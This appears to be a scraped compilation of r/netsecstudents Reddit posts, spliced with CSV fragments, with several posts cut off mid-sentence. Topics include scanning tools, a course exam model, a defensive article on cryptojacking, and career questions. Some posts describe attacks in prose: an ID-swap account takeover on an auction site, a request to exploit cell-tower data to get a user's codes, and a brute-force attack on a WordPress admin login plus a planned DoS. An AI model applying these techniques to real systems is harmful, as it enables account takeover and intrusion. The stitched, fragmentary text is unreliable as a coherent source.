Took me about a year of bugging them to get them to let me do vulnerability scans (i'm not on the security team, and nothing ever opens up for me to move into). they don't let me in on the remediation part unfortunately, so I want to learn that on my own as much as I can. what's the best way to do this? I know that there are intentionally vulnerable VMs out there for use in penetration testing practice. could I take those same vulnerable VMs and learn how to patch/remediate them, or is there a better way?

My list of tools currently contains Wapiti, Skipfish, Arachni, Nettacker, ZAP. But Im open to anything. The biggest issue atm is that Im not getting any results from wapiti or skipfish for example Furthermore I cant seem to find a real target to test the tools on, as I believe that the vulnerable VMs are not enough. Additionally I dont know how to test/compare the quality of the tools in regards to fuzzing and crawling. I have absolutely no idea how to start with this...

I wish somebody could just help me with deciding which tools to use, which targets to choose and which aspects to compare.

12,vulnerability,netsecstudents,New Examination Model,1,filife,https://www.reddit.com/r/netsecstudents/comments/filife/new_examination_model/,2020-03-15 03:59:54,"Now that we will update the [course](URL next April and have already added almost 100 new pages of material, we have also revised and refined the certification process. In this topic, I would like to introduce you to the new examination model we have developed for [**SHELL-AFFECT**](URL certification process. This topic is structured as follows: &amp;#x200B; * 1.0 The necessity and goals of the examinations. * 2.0 The problems * 3.0 New Examination Model * 3.1 Goals of the Examination * 3.2 Examination Phases * 3.2.1 Course Material * 3.2.2 Lab Environment * 3.2.3 Live Presentation * 3.2.4 HackTheBox Rank (Bonus) * 4.0 Requirements for Passing # 1.0 The necessity and goals of the examinations Before we go into the model, we should take a look at what such an examination is necessary for. We know that such exams serve to determine the skills and the required level of knowledge. The skills and the required knowledge should be acquired through a course or workshop. The learning material provided by the training provider should teach a particular repertoire so that the student can allow his/her creativity to solve problems that may arise. Almost all exams have a time limit. Some give the student more time and others less. This is not only necessary for organizational reasons but also puts the student in a hard position to be able to quickly retrieve his or her knowledge when time pressure and effort are high. This way, the actual internalized processes, and skills are used, which the student should be able to apply intuitively. Above all, the certificates obtained after such a passed examination should prove that the student has made a certain effort to pass it. Accordingly, this student has been able to prove to the certification body that he or she has acquired the required skills and knowledge in the examination environment provided by the training provider. Especially in the area of penetration testing, the training providers try to check whether the student has developed a structured methodology for the given material. So let us summarize what we have now: &amp;#x200B; * possesses the skills taught in the course or workshop * Has internalized the knowledge taught * The student can combine his knowledge with his creativity to solve problems under time pressure and in a given environment. * The student has achieved a high level of effort and performance * Material for the development of the methodology # 2.0 The problems Regarding the required knowledge that a student is expected to achieve in a course or workshop, we found the problem that the exams too often focus on the performance of the short-term memory and therefore fail to test the actual skills, knowledge, and especially the understanding of the subject being studied. Often such courses or workshops offer temporary learning environments or better said too short learning conditions for studying and practicing. Otherwise, students have to make a higher financial investment to be allowed to continue to practice. This fact puts the student in a situation where he or she has the material but cannot continue to practice to internalize the knowledge offered. If a training provider offers learning materials and provides the student with the exam environment, they will dictate the student exactly how to proceed. The exam environment is based on the topics covered in the learning material. The student may be able to prove that he/she has solved one scenario or another, but only the problems of the specific topics are solved. If the environment differs from the known structure, the student is usually no longer able to solve the problem alone. Obtaining a certificate may serve as a confirmation, but more than just the sheet of paper, the student cannot present anything more to the potential employer. For the methodology, the examiners want to see that the student knows what he is doing and how. The development of such a methodology is not covered in the courses, which should help the student to develop its approach and methodology adapted to his strengths and weaknesses. This requires something that is not taught and is not even mentioned what it is to pay attention to. If we relate this to the point of creativity and say that the student must be able to do it himself, it is like an example when in an exam, the student is asked to build an engine he has never seen before. Especially here, it is essential to learn not only to use tools for the identification of vulnerabilities but also to understand how these vulnerabilities can arise during configuration and administration. Instead, as penetration testers, we have to understand the tested environment better in a very short time than as administrators who took days, weeks, or even months for development. In the end, the art is not to exploit the application, machine, or network but to find the way into it. In summary, we see the following problems: &amp;#x200B; * No.1 mostly the performance of the short-term memory is queried * No.2 limited and cost-intensive practice environments to internalize the learning material * No.3 Based on the learning material, the student is given the path * No.4 The orientation for problem-solving is predefined * No.5 Passing the test only leaves only a certificate as proof of completion * No.6 No material or explanations are provided for the development of methodology but are required for the exam * No.7 Due to the limited and predetermined working environments, the creativity of the student is limited * No.8 The individual strengths and weaknesses of the student are not considered Some points have been omitted here, but these are the most important ones that should be clarified here. # 3.0 New Examination Model ### 3.1 Goals of the Examination The goal of the exam is to verify that the student has the theoretical knowledge and intermediate practical skills to test different types of systems for various vulnerabilities under high time pressure. Also, the student will be tested if he/she has developed a structured and logical methodology that allows him/her to creatively find ways to exploit the systems and their configurations for unauthorized access. It should also be verified that the student has developed an understanding of how such vulnerabilities can occur in administration and configuration processes. The certification should not only be a proof of completion of the course, but rather a confirmation of long and intensive theoretical and practical study in the field of Penetration Testing / Ethical Hacking, which also makes it possible for the student to present his work to potential employers in the future. Summary: 1. Verify theoretical knowledge 2. Verify intermediate practical skills 3. Verify structured methodology 4. Verify understanding of how vulnerabilities can occur ### 3.2 Examination Phases The certification process is divided into 4 phases. A maximum of **100 points** can be collected. To pass the exam, the student has to collect at least **80 points** . **Examination** **phases:** 1. Course Material - Exercises 2. Lab Development 3. Live Presentation 4. Rank (Bonus) ### 3.2.1 Course Material In the first phase, the student deals with the course material. Here the student gets **0.5 points** for each solved exercise. Actually, there are **77 evaluated exercises** in total. This means that the student can earn a maximum of **38.5 points**, but the point limit for this part is fixed at a maximum of **30 points** . Exercises marked as **not required** are not evaluated. This gives the student the flexibility to fulfill its abilities according to his own preferences and needs. Also, this solution provides the student with the possibility to skip 17 tasks and still achieve the full score. &amp;#x200B; * Each exercise that takes the activity of the student in the form of testing or configuration requires at least **one** screenshot. * Students ID/Username must be visible in all screenshots. This can be the username or a comment in the working environment. If no screenshot was taken for an exercise or the ID/Username is not visible in the screenshot, the exercise will be evaluated with **0 points**. Each exercise **must** be clearly and unambiguously documented. **Solution for problem No. 3:** &amp;#x200B; * The learning material and the exercises do not prescribe a way for the student to use. **Solution for problem No.4:** &amp;#x200B; * When working through the course material, the exercises do not tell the student how to solve them. The student will come across problems and situations that can be individual due to the different approaches and require the student to review and analyze his/her own approach to find his/her mistakes. **Solution for problem No.6:** &amp;#x200B; * The course itself contains over 20 pages of material that deals only with the learning process, strengths, weaknesses, ways of learning, and the development of a methodology with many assisting elements. **Solution for problem No.8:** &amp;#x200B; * The student himself decides, according to his/her own strengths and weaknesses, how to solve the exercises. The student can skip some of the exercises and still get the full score for this phase. After all, we do not have to and cannot know everything. Therefore it is advantageous to use our strengths and minimize our weaknesses. ### 3.2.2 Lab Environment During the course, the student starts to create a locally hosted vulnerable network that simulates a realistic scenario where the student performs a full penetration test. This phase requires the creation of configuration documentation and a penetration testing report that explains step-by-step all changes and activities performed by the student. These two documentations, in addition to the documentation for the exercises, must be made accessible to the examiner in a password-protected ZIP archive at least 5 days before the presentation date. For the exam, he/she needs to set up and configure **5** vulnerable VMs, which are vulnerable in different ways. This means that only one vulnerability of e.g., RCE/LFI/RFI/XSS/SQLi or vulnerable application may be present in the entire configuration of the vulnerable Lab environment. The Lab must also contain at least one Linux and Windows-based operating system. The point allocation depends on the proximity to reality and complexity. The student can achieve a maximum of **7 points** per VM. This results in a total score of 35 points. For this category, a point limit of **25 points** has been set. **Solution for problem no. 5:** &amp;#x200B; * In this phase, the student not only deals with each service and its configuration but also gets insight from an administrators perspective, which gives the student an understanding of the respective services, what information they work with and how vulnerabilities in the configurations can occur. The student will create two documentations that describe the configuration and its exploitation in detail. These documentations can later be presented to the potential employers as already performed performance in addition to the certificate, which in turn increases the chances for a commitment. ### 3.2.3 Live Presentation The most important aspect of certification is its appreciation, which comes with the work done by the student. It is intended to confirm that the student has the appropriate knowledge and skills required for this. This is technical knowledge and practical skills, especially the confirmation of the development and use of their methodology. Besides that, an essential skill that has to be verified is that the student has a structured methodology to approach scenarios and solve problems and find the way into the machine. After the live session is established, the **Creativity Of Problem Solving - scripts (COPS-Scripts)** scripts come into play. The COPS Scripts are small scripts created by the examiners based on the documentations provided by the students, which modify the Lab environment. These changes force the student to take specific steps necessary to find the path to the vulnerability. Additionally, these COPS scripts generate the **user.txt** and **root.txt** files with the appropriate hash values that the student must get. Also, these scripts change the **passwords** of the User and root/Administrator. &amp;#x200B; Such a lab will often be different, and the COPS scripts reduce the chances that the same environment will be used for the exams. This, in turn, prevents the exam from being leaked. The student gets informed just during the presentation, which VMs will be changed by the COPS-Scripts and should be tested again. In this phase, the practical skills, as well as the methodology and approach, are explicitly tested, as the student operates in a well-known environment to find the vulnerabilities. ### 3.2.4 HTB Rank (Bonus) Since the student has the opportunity to practice for 1 year as a VIP on the HackTheBox Platform with over 140 VMs, he also can earn bonus points based on his rank. A maximum of 10 points can be earned here. With the rank Script Kiddie, the student receives **5 points**. If he reaches the rank Hacker, another **5 points** will be awarded to the student for the exam. A total of 10 points can be earned in this phase. **Solution for problem no. 1, 2, and 7:** &amp;#x200B; * Since the course is designed based on the HackTheBox Platform and the student can also get VIP status for cheap to get access to over 140 VMs with the course, it gives the student 1 year time to train and internalize his/her knowledge and skills. ### 4.0 Requirements for Passing To be able to check the theoretical part, the student has to take an exam in which he/she creates services, configures them, and understands how they work and learns to understand how already found vulnerabilities could occur. Another critical factor is that the student should not be given a path to use. It should be possible for the student to encourage their creativity and to extend their strengths in the best possible way and to improve their weaknesses as far as possible. These areas are covered by the first (1. Course Material - Exercises) and the second (2. Lab Development) phase. The practical part is about the realization of theoretical knowledge and a logical and structured methodology and approach. To verify these skills and to further enhance the strengths and weaknesses of the student, the skills are tested in his/her local Lab and under high time pressure. An examiner must supervise and evaluate the students approach through a **60** **minutes** screen sharing session (3. Presentation). This process uses the so-called **Creativity Of Problem Solving - Scripts** (COPS-Scripts), which change the students local Lab and make him/her take specific steps to find the way to the configurations or weaknesses. As a bonus, the student can earn additional points with the practical area if he/she reaches specific ranks (4. Rank). **Summary:** &amp;#x200B; 1. Development and configuration experience 2. Creative thinking 3. Fast and smart learning methodology 4. Practical realization of the theory 5. Working under high time pressure 6.

Hackers do this by either getting the victim to click on a malicious link in an email that loads **cryptomining** code on the computer, or by infecting a website or online ad with JavaScript code that auto-executes once loaded in the victims browser. Either way, the cryptomining code then works in the background as unsuspecting victims use their computers normally. The only sign they might notice is slower performance or lags in execution. **Why cryptojacking is popular** No one knows for certain how much cryptocurrency is mined through cryptojacking, but theres no question that the practice is rampant. Browser-based cryptojacking grew fast at first, but seems to be tapering off, likely because of cryptocurrency volatility. In November 2017, [Adguard reported a 31 percent growth rate](URL for in-browser cryptojacking. Its research found 33,000 websites running cryptomining scripts. Adguard estimated that those site had a billion combined monthly visitors. In February 2018, [Bad Packets Report](URL found 34,474 sites running Coinhive, the most popular JavaScript miner that is also used for legitimate cryptomining activity. In July 2018, [Check Point Software Technologies reported](URL that four of the top ten malware it has found are crypto miners, including the top two: Coinhive and Cryptoloot. However, [Positive Technology's Cybersecurity Threatscape Q1 2019](URL report shows that cryptomining now accounts for only 7% of all attacks, down from 23% in early 2018. The report suggests that cybercriminals have shifted more to ransomware, which is seen as more profitable. Cryptomining is in its infancy. Theres a lot of room for growth and evolution, says Marc Laliberte, threat analyst at network security solutions provider WatchGuard Technologies. He notes that Coinhive is easy to deploy and generated $300 thousand in its first month. Its grown quite a bit since then. Its really easy money. Cryptojacking doesnt even require significant technical skills. According to the report, [The New Gold Rush Cryptocurrencies Are the New Frontier of Fraud](URL from Digital Shadows, cryptojacking kits are available on the [dark web](URL for as little as $30. The simple reason why cryptojacking is becoming more popular with hackers is more money for less risk. Hackers see cryptojacking as a cheaper, more profitable alternative to ransomware, says Alex Vaystikh, CTO and cofounder of SecBI. With ransomware, a hacker might get three people to pay for every 100 computers infected, he explains. With cryptojacking, all 100 of those infected machines work for the hacker to mine cryptocurrency. \[The hacker\] might make the same as those three ransomware payments, but cryptomining continuously generates money, he says. The risk of being caught and identified is also much less than with ransomware. The cryptomining code runs surreptitiously and can go undetected for a long time. Once discovered, its very hard to trace back to the source, and the victims have little incentive to do so since nothing was stolen or encrypted. Hackers tend to prefer [anonymous cryptocurrencies like Monero and Zcash](URL over the more popular Bitcoin because it is harder to track the illegal activity back to them. **How cryptojacking works** Hackers have two primary ways to get a victims computer to secretly mine cryptocurrencies. One is to trick victims into loading cryptomining code onto their computers. This is done through phishing-like tactics: Victims receive a legitimate-looking email that encourages them to click on a link. The link runs code that places the cryptomining script on the computer. The script then runs in the background as the victim works. The other method is to inject a script on a website or an ad that is delivered to multiple websites. Once victims visit the website or the infected ad pops up in their browsers, the script automatically executes. No code is stored on the victims computers. Whichever method is used, the code runs complex mathematical problems on the victims computers and sends the results to a server that the hacker controls. Hackers often will use both methods to maximize their return. Attacks use old malware tricks to deliver more reliable and persistent software \[to the victims computers\] as a fall back, says Vaystikh. For example, of 100 devices mining cryptocurrencies for a hacker, 10% might be generating income from code on the victims machines, while 90% do so through their web browsers. Some cryptomining scripts have worming capabilities that allow them to infect other devices and servers on a network. It also makes them harder to find and remove; maintaining persistence on a network is in the cryptojacker's best financial interest. To increase their ability to spread across a network, cryptomining code might include multiple versions to account for different architectures on the network. In one example described in an [AT&amp;T Alien Labs blog post](URL the cryptomining code simply downloads the implants for each architecture until one works. The scripts might also check to see if the device is already infected by competing cryptomining malware. If another cryptominer is detected, the script disables it. A cryptominer might also have a kill prevention mechanism that executes every few minutes, as the AT&amp;T Alien Lab post notes. Unlike most other types of malware, cryptojacking scripts do no damage to computers or victims data. They do steal CPU processing resources. For individual users, slower computer performance might be just an annoyance. Organization with many cryptojacked systems can incur real costs in terms of help desk and IT time spent tracking down performance issues and replacing components or systems in the hope of solving the problem. **Real-world cryptojacking examples** 1. **Spear-fishing PowerGhost steals Windows credentials** 2. **Graboid, a cryptominder worm spread using containers** 3. **MinerGate variant suspends execution when victim's computer is in use** 4. **BadShell uses Windows processes to do its dirty work** 5. **Rogue employee commandeers company systems** 6. **Serving cryptominers through GitHub** 7. **Exploiting an rTorrent vulnerability** 8. **Facexworm: Malicious Chrome extension** 9. **WinstarNssmMiner: Scorched earth policy** 10. **CoinMiner seeks out and destroys competitors** 11. **Compromised MikroTik routers spread cryptominers** **How to prevent cryptojacking** Incorporate the cryptojacking threat into your [security awareness training](URL focusing on phishing-type attempts to load scripts onto users computers. Training will help protect you when technical solutions might fail, says Laliberte. He believes phishing will continue to be the primary method to deliver malware of all types. Employee training wont help with auto-executing cryptojacking from visiting legitimate websites. Training is less effective for cryptojacking because you cant tell users which websites not to go to, says Vaystikh. **Install an ad-blocking or anti-cryptomining extension on web browsers.** Since cryptojacking scripts are often delivered through web ads, installing an ad blocker can be an effective means of stopping them. Some ad blockers like Ad Blocker Plus have some capability to detect cryptomining scripts. Laliberte recommends extensions like [No Coin](URL and [MinerBlock](URL which are designed to detect and block cryptomining scripts. **Use endpoint protection that is capable of detecting known crypto miners.** Many of the endpoint protection/antivirus software vendors have added crypto miner detection to their products. ""Antivirus is one of the good things to have on endpoints to try to protect against cryptomining. If its known, theres a good chance it will be detected,"" says Farral. Just be aware, he adds, that crypto minor authors are constantly changing their techniques to avoid detection at the endpoint. **Keep your web filtering tools up to date.** If you identify a web page that is delivering cryptojacking scripts, make sure your users are blocked from accessing it again. **Maintain browser extensions**. Some attackers are using malicious browser extensions or poisoning legitimate extensions to execute cryptomining scripts. **Use a mobile device management (MDM) solution to better control whats on users devices.** Bring-your-own-device (BYOD) policies present a challenge to preventing illicit cryptomining. MDM can go a long way to keep BYOD safer, says Laliberte. An MDM solution can help manage apps and extensions on users devices. MDM solutions tend to be geared toward larger enterprises, and smaller companies often cant afford them. However, Laliberte notes that mobile devices are not as at risk as desktop computers and servers. Because they tend to have less processing power, they are not as lucrative for the hackers. None of the above best practices are foolproof. In recognition of that, and the growing prevalence of cryptojacking, cyber risk solution provider Coalition now offers service fraud insurance coverage. According to a [press release](URL it will reimburse organizations for and direct financial losses due to fraudulent use of business services, including cryptomining. **How to detect cryptojacking** Like ransomware, cryptojacking can affect your organization despite your best efforts to stop it. Detecting it can be difficult, especially if only a few systems are compromised. Dont count on your existing endpoint protection tools to stop cryptojacking. Cryptomining code can hide from signature-based detection tools, says Laliberte. Desktop antivirus tools wont see them. Heres what will work: **Train your help desk to look for signs of cryptomining.** Sometimes the first indication is a spike in help desk complaints about slow computer performance, says SecBIs Vaystikh. That should raise a red flag to investigate further. Other signals help desk should look for might be overheating systems, which could cause CPU or cooling fan failures, says Laliberte. Heat \[from excessive CPU usage\] causes damage and can reduce the lifecycle of devices, he says. This is especially true of thin mobile devices like tablets and smartphones. **Deploy a network monitoring solution.** Vaystikh believes cryptojacking is easier to detect in a corporate network than it is at home because most consumer end-point solutions do not detect it. Cryptojacking is easy to detect via network monitoring solutions, and most corporate organizations have network monitoring tools. However, few organizations with network motoring tools and data have the tools and capabilities to analyze that information for accurate detection. SecBI, for example, develops an artificial intelligence solution to analyze network data and detect cryptojacking and other specific threats. Laliberte agrees that network monitoring is your best bet to detect cryptomining activity. Network perimeter monitoring that reviews all web traffic has a better chance of detecting cryptominers, he says. Many monitoring solutions drill down that activity to individual users so you can identify which devices are affected. ""If you have good egress filtering on a server where youre watching for outbound connection initiation, that can be good detection for \[cryptomining malware\],"" says Farral. He warns, though, that cryptominer authors are capable of writing their malware to avoid that detection method. **Monitor your own websites for crypto-mining code**. Farral warns that crypto jackers are finding ways to place bits of Javascript code on web servers. ""The server itself isn't the target, but anyone visiting the website itself \[risks infection\],"" he says. He recommends regularly monitoring for file changes on the web server or changes to the pages themselves. **Stay abreast of crypto jacking trends.** Delivery methods and the crypto-mining code itself are constantly evolving. Understanding the software and behaviors can help you detect crypto jacking, says Farral. ""A savvy organization is going to stay abreast of whats happening. If you understand the delivery mechanisms for these types of things, you know this particular exploit kit is delivering crypto stuff. Protections against the exploit kit will be protections against being infected by the cryptomining malware,"" he says. **How to respond to a cryptojacking attack** **Kill and block website-delivered scripts.** For in-browser JavaScript attacks, the solution is simple once cryptomining is detected: Kill the browser tab running the script. IT should note the website URL thats the source of the script and update the companys web filters to block it. Consider deploying anti-cryptomining tools to help prevent future attacks. **Update and purge browser extensions.** If an extension infected the browser, closing the tab wont help, says Laliberte. Update all the extensions and remove those not needed or that are infected. **Learn and adapt.** Use the experience to better understand how the attacker was able to compromise your systems. Update your user, helpdesk and IT training so they are better able to identify cryptojacking attempts and respond accordingly. SOURCE LINK: [URL (Sometimes requires you to log-in)."

First, I'm wanting to start with vulnerability testing, sniffing etc of my own personal network so that I can learn how to read the information I'm collecting, be able to identify what wrong looks like so I can make it look how it should. I figured the best way to learn is to do these things with my own network. What suggestions do you have in regard to how I start this process? Software, hardware, research etc Secondly, do you find yourself needing or have both a laptop and tablet everywhere you go? I ask because I was thinking about an iPad to accompany my Thinkpad but then I began wondering do i really need both, is it beneficial to have Windows, Linux and Mac in just two devices. What are your thoughts? Thanks"
22,vulnerability,netsecstudents,SnowHat | Game Hacking | Bug Bounty Platform,1,ecedha,https://www.reddit.com/r/netsecstudents/comments/ecedha/snowhat_game_hacking_bug_bounty_platform/,2019-12-19 02:52:52,"Dear fellow hackers, As a startup company (Cyrex Ltd) that is specialised in application security, we are developing a bug bounty platform (codename: SnowHat) that is entirely focused on hacking gaming applications. We strongly believe that gaming applications are different to classic industry applications. Consider the used programming language, frameworks, architecture used and more importantly the way data is being transmitted (transport protocol). Therefore, it's a natural direction for us to create a bug bounty platform that is fully focused around the security of gaming applications. The objective of this thread is to validate the concept of our product/service. Therefore, **your** **feedback** is extremely valuable to us, especially in this phase of development where the platform is subject to constant change. **Mindset** Game hacking is very different in comparison to classic penetration testing, it requires two mindsets: one of a cheater and one of a hacker. Two very similar mindsets yet there are distinct differences between them. Cheating is all about finding an advantage that a regular player would not be able to have, this requires gaming knowledge, strategic insights and most importantly quickly understanding in game mechanics. While hacking is all about exploiting technical vulnerabilities, understanding what is going on under the hood of the application. **Assets** The platform currently covers the following categories: 1. Games (browser, mobile, client and console) 2. Game relatable applications (forums, launchers, management tools, ...) 3. Anti-cheat solutions/wrappers (EAC, BattlEye, ...) **Gamification** Through gamification (challenges, achievements, ...), we want to create a bug bounty platform that encourages hackers to start their journey as a white hat security expert and more importantly reward them for their findings. We have implemented clan mechanics, just like in any other MMO, this in order to build a community and add in that competitive element, which really takes this platform to a next level. Ranks are implemented accompanied by leaderboards and ranks are based on the prestige of the player. Prestige points are unlocked for each legit disclosed report. **Communities** For SnowHat, it made full sense to cooperate with hacking communities as these communities are often where all things start. They act as a gold mine of educational resources that will help any hackers in developing their hacking skill set. Therefore, we want to give back to those communities by partnering up. For each member originating from these communities that finds a vulnerability, a percentage of the bounty is paid back to the community by SnowHat. Two large partnerships were established so far, attracting over 500K members to the platform. **Gaming companies** Next to generating a user base of ethical hackers, we started establishing partnerships with gaming companies, an obvious yet fundamental element that will define the success of SnowHat. The platform targets mid-to-large size companies that either develop or publish gaming applications with online multiplayer features (as there's no such thing as security in offline games). **Communication and QA** The SnowHat team acts as an intermediate communication layer between the ethical hacker and the gaming company. The ethical hacker will never be in direct contact with the gaming company, the ethical hacker will be collaborating with SnowHat staff, vice versa for gaming companies. In this way we can maintain and enforce quality assurance on many different levels (communication, quality of report, triage, ...). **Release** Best-case, we are planning to release into beta mid Q2 2020. At first, the beta will only be accessible to the members of the communities we've partnered with. After continuous validation of at least 1 month, the platform will be publicly available to anyone. To give you an idea of what the platform will look like, we included the following images (screenshots). Take into account that all of this is subject to change, thus not a final version. By using dummy data some of the screenshots might be confusing. &amp;#x200B; [Frontstore - Home](URL &amp;#x200B; [Frontstore - Cheaters](URL &amp;#x200B; [Frontstore - Companies](URL &amp;#x200B; [Hacker dashboard - Hacktivity\/Pwnage](URL &amp;#x200B; [Hacker dashboard - Hackables](URL &amp;#x200B; [Hacker dashboard - Inbox - Reports\/Write-ups](URL &amp;#x200B; [Hacker dashboard - Leaderboard](URL &amp;#x200B; [Hacker dashboard - Clans](URL &amp;#x200B; [Hacker dashboard - Badges\/achievements](URL We want to thank the Reddit users in advance for reading this post and more importantly for giving their feedback.

Hopefully this is vague enough while still getting the information across. First off I want to say that I have a surface level understanding of a lot of this stuff, it's been years since I looked up anything net sec. That's how glaringly obvious this flaw is, I barely know anything and I found it. That's the other part, I am certain there's more problems than the one I found but I would need help finding them. That's not why I made this post I'm just throwing that out there. Friend tells me to look at this auction that the company she works for is running through this auction site. She goes to put in her ""username"" and the next page we see says ""Is this [NAME]?"" and yes or no. You click yes and you can make bids on these items as her without any password. You can enumerate over the ""usernames"" and get everyone's names associated with this auction. At first harmless enough, there's no way to see any personal information (other than the last 4 of the card on file, if there is one). There are password protected accounts, these are accounts that the user signed up for themselves and didn't have the admin of the auction set up the account for them. But it's as simple as changing ""password.php?id=1"" to ""confirm.php?id=1"". These protected accounts you can then see and modify, address, phone number, and email. You can also change the password. But it's worse than I thought, on ALL of the accounts this information is being sent, there's just no way to display it on the web page (that I could find). But it's both in the source and it makes two separate requests to ""get_phonenumber.php"" and ""get_email.php"". I'm not sure if it's possible to modify information on the accounts the admin set up but that's because I don't know enough. I wouldn't doubt that you can. This means you can use their card they have already set up in the account to bid on something, change the address to wherever you want, and you'd be able to change the email and password so there's nothing that could be done to stop it. I'm also afraid of how simple it might be to login as the admin of these auctions, but haven't looked into that. Anyway long story short how do I go about reporting this? This auction site has no way of contacting them other than to set up an auction. I could contact the company that set up this specific auction and tell them the site has terrible security (which the site boasts top tier security) But the site has this issue for every single auction running. Also I assume I wouldn't get in any trouble for pointing this out, right?"

Of course you have access to any other machine behind a router, but if they're not running services anyway which I'd imagine they're not, what can you do with them?

Our IDPS sensors are extremely noisy and we often see a huge variety of alerts. We struggle with being able to effectively triage these incidents due to the lack of contextual information. For example, if we receive an alert stating that an SQL injection attack has taken place and Wasnt blocked - how can we determine that this was successful? Other scenarios include - A vulnerability has been exploited , which normally results in remote access - how do we validate whether this was successful(if allowed through the IDPS) I appreciate that the issue here lies with signatures not blocking, however for business reasons this isnt a quick fix. How do you guys triage the IDPS alerts? Any help would be appreciated!"

Is there a way we can find out the last 2 codes of the user. I mean is there any public directory that has all the information and gets updated every second. Is there a vulnerability or exploit in the cell tower triangulation method that we can use to get the codes. Is there any algorithm or formula to calculate the last 2 codes i.e like (last 4 digit of phone number + x / x or any thing like that).

I received an email later that day saying that they would like to speak to me again, but for a more fleshed out conversation. Again, we booked a time for that Friday coming, and they followed up with a call. This was with a panel of 3 people, and was a traditional interview to get to know more about me and my work history. What are some of my interests, things I have accomplished, difficulites I have faced and overcome, etc. It lasted approximately 35 - 40 mins, and gave me a chance to ask some questions about the internship and the culture surrounding the company. The following Tuesday (5 days later) I received another email saying that they would like to speak with me again, but this time for a technical interview. Of course I accepted, and we booked a time for the following week for a final interview. This was where the technical questions were. It was with a panel of 4 people, including NetSecEngineers and managing officers.

(trick question!) * Explain XSS * Which lead into questions about XST, SQLi, WebAppSec, etc. * Also lead into explaining the difference between reflective and persistent * My experience with SQL, NoSQL, MySQL, etc. * Where do I get news about CyberSec from? * How do I protect myself and my network? * Questions about the work on my GitHub page - (i'll link it if it helps anyone - mainly reports on File System forensics and some papers on web app security, and buffer overflows) * Securing PHP and JS * Experience with cloud services: Azure, AWS, etc. * Experience with firewalls, networking, etc. * Expereince with encryption * Should you encrypt or compress first? * What is salting and how is it used? * How should private data be stored on a server? * How should that data be retrieved? * Which lead into public key infrastructure, Assymetric vs Symettric keys, etc. * Explain the implications for an organisation under GDPR * SSL, TLS, and HTTPS This third round interview lasted approximately an hour, and being my first technical interview I wasn't sure what to expect, luckily I was able to answer all their questions, not in as much detail as I would have liked for some (experience with SQL but not NoSQL, etc.) but overall went well.

I have been doing Support/Sysadmin for 8 years and landed this role and super stoked about it. Firstly, I need to keep pinching myself and telling myself that this is not a support/administration role at all. I do not get calls (its rarely that a phone rings in the SOC), there are no walk ups asking for assistance. We are not assisting anyone with their issues. So that took me back a bit and made me realise. Its really quiet and people just work on their alerts. Really really quiet. **Technology:** The technology that is used is we Linux, Apache + Elastic Stack + Kibana to visualise and parse the logs (syslogs). We are currently only monitoring syslogs at the moment and hoping to have more in the future which Im excited about. The appliances that we monitor are firewalls IPS/IDS at the moment. From my observation and my experience with working at heavy MSPs/vendors that has KPIS (20 tickets closure per day etc), I can see that its not busy because we do not have a lot of customers. I hope to utilise my time learning as much as I can. Also their P1s are funny in a sense that we are not receiving logs. For P1, I'm thinking the network is down, no one can work! But they classify this as a P1 because if we are not receiving the logs, then during the time of when it was not working til when it starts working = there could of been an incident that we are unaware of. **Notes/Questions:** What types of services do you think customers would want as a Service? For example IRaAS, Vulnerability management as a service etc Further to this, knowing this is the technology we use, how do you think I could further my study with this?

I started off with a BSc in Mathematics, MSc in Information Security and OSCP with a starting salary at 28k. I was having a hard time finding a job because I had no experience in Security and I also applied quite late in the year. It has been 3 months since then and during that time, I have got my CPSA and CRT in under 2 months passing first time and OSWP in the third month. I'll be able to get my SC clearance and become a CHECK team member very soon. I have also done many reports and web/infrastructure testing during that time, most with our biggest clients. The only thing I havent done is onsite work, but I believe I'll be able to do this soon. As you can tell, I started off with quite a low salary, and I believe I have shown that I am worth more. I want to ask my boss after 6 months, or if that's too soon, after a year for a raise. However, I am also not sure what salary to ask for. I am not being arrogant, but I feel like I do the same work as the CHECK team members and some of the leaders (some of the CTL work's quality really differs). In terms of quality and vulnerability found, I have that covered. I just lack some experience in the work environment and consistency with my reports which I feel will come in time. Could someone give me a rough guideline what to expect after 6 months, a year, 2 years in my current situation? "

Last year I went into a chatroom, got ahold of an admin, and told them I had a security issue to report. They gave me an email address and told me to send the info to them and they'd fix it. I did as told and sent proof in screenshots, how to reproduce the exploit, and even a few links that would tell them how to fix it. They told me they'd fixed it. They didn't. Now here I am, wondering what to do. Looking at the databases for the site once again. I've sent proof multiple times via email, talked to the owners personally in a live chat. And they even promised to fix it. I'm out of ideas and this isn't hard to exploit. For some context, this is a relatively small website. Less than 100k users I'd bet. The databases I found include 40k+ Physical Addresses, 32k+ Login Info, and the login info for all the admins. What do I do. They won't listen. "

I've been doing full stack web application development for the past few years as a consultant and have recently been reading a bunch of books on network and application security. I managed to pitch a potential web dev client on letting me do a security assessment of their current web stack before coming on, but I wanted to see if there were any holes in my work. The client gave me a list of a few dozen different domains they own (lots of targeted lead generation websites, collecting information from users who are interested in offers for different industries) and told me they really wanted me to focus on their more recent websites that was all hosted on one particular server. I asked if they were concerned about someone accessing their database of the submitted personal information (mostly name, email, zip, gender) but they said they were more focused on how resilient the sites were and how well they'd stay online and resist attacks. Here's what I've done so far: 1. Resolved all of the domains to confirm which ones pointed at the correct server they wanted tested (some domains were parked so I could ignore those) 2. Did an `nmap` scan doing OS detection/banner grabbing and scanning all possible ports (1-65535). The only ones that were open were 80 and 443 (good for client, bad for me). Seemed like there wasn't much of an attack surface at the network layer. 3. From HTTP ""Server"" header, I saw they were running apache 2.4.10 which [has a list of known vulnerabilities](URL None looked too promising, but I'm going to play around with a few of the CVEs in metasplot later. 4. Looking through the HTML response of their web page, I saw most of the sites were running WordPress as the CMS. I ran a quick version detection script and saw that all the sites were running 4.1.17. Did a `wpscan` on a few of the domains and they all seemed to have similar output. A few missing security headers and a potential stored XXS for getting user's sessions, but the site doesn't use logins and the client said that social engineering any of their employees was out of scope, so it didn't seem like there was much I could use to get privileged access to the site. 5. I ran a `nikto` scan against a few of the domains, hoping there might be an exposed phpMyAdmin or something, but again, not much besides a few missing security headers. 6. I found that their wordpress login page used HTTP Basic Auth (browser displayed a pop-up asking for username and password). I grabbed the list of the [top 1MM passwords](URL and started firing those off with the default ""admin"" user. Burp Intruder was pretty slow so I wrote a python script that used threads to do it myself in a few hours. Nothing matched :/ The last thing on my list where I might actually score a win is launching a DoS attack (during an approved time window) to see if I can overwhelm the site with traffic and take it offline. Other than that, I'm not sure that I'll really be able to present any substantial vulnerability findings, which I'm pretty bummed about. Are there any other leads you think I could chase? At a higher level, does this sound like stuff a script kiddie would be capable of or is this in the realm of an actual, professional security audit? Thanks for any and all 